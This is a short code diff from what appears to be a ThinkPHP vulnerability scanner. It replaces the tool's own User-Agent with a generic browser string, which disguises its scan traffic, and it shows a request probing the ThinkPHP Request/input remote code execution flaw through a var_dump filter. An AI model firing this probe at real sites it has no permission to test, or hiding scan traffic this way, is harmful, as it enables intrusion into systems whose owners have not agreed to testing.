@@ -16,7 +16,7 @@ def thinkphp_request_input_rce_verify(url):
         "exception":"",
     }
     headers = {
-        "User-Agent" : 'TPscan',
+        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0)',
     }
     try:
         vurl = urllib.parse.urljoin(url, 'index.php?s=index/\\think\Request/input&filter=var_dump&data=f7e0b956540676a129760a3eae309294')
